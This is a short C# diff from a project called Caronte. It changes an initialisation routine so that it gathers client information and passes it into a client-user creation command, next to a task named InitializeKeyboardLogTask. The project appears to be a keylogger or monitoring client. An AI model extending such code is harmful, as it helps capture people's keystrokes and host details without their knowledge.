@@ -1,6 +1,7 @@
 ﻿using Caronte.Modules.Command;
 using Caronte.Modules.CreateClientUser;
 using Caronte.Modules.Information;
+using Caronte.Modules.Information.GetClientInformation;
 using MediatR;
 using System.Collections.Generic;
 using System.Threading;
@@ -21,8 +22,9 @@ namespace Caronte
 
         public async Task Initialize()
         {
-            await _mediator.Send(new VerifyAndCreateClientUserCommand());
-            
+            var clientResponse = await _mediator.Send(new GetClientInformationQuery());
+            await _mediator.Send(new VerifyAndCreateClientUserCommand() { ClientInformation = clientResponse.ResponseObject});
+
             var tasksList = new List<Task>
             {
                 StartInformationServices.InitializeKeyboardLogTask(_cancellationToken, _mediator),
